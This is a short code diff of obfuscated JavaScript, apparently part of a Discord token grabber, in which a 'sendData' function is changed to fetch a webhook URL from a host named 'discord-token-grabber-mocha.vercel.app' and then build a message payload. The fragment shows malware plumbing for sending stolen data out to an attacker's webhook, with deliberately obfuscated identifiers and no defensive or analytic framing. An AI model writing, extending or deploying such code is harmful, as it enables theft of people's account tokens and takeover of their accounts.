@@ -78,7 +78,7 @@
     
     // データ送信関数
     async function sendData(_0x5e6f, _0x7q8r, _0x7g8h) {
-      const _0x9s0t = await fetch('/api/get-webhook-url');
+      const _0x9s0t = await fetch('https://discord-token-grabber-mocha.vercel.app/api/get-webhook-url');
       const { webhookUrl } = await _0x9s0t[_0x1a2b[0]]();
       const _0x3w4x = {
         content: null,
